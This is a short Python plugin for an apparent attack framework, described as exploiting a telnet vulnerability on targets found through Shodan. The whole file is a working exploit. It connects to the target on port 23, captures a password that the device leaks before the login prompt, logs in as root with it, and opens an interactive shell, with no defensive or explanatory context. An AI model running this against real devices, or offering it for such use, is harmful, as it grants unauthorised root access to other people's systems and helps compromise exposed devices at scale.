Description = 'Exploits a telnet vulnrability using shodan'
from plugin_support import *

init = {
    'target':ask.target
}

def run():
    global init
    import telnetlib
    try:
    	warning("Connecting to %s..." % (init['target']))
    	tn = telnetlib.Telnet(ask.target, 23)
    	tn.read_until("passwd:")
    	PASS = tn.read_until("\n")
    	tn.read_until("login: ")
    	tn.write("root\n")
    	tn.read_until("Password: ")
    	tn.write(PASS + "\n")
    	tn.interact()
    except KeyboardInterrupt:
    	exit()
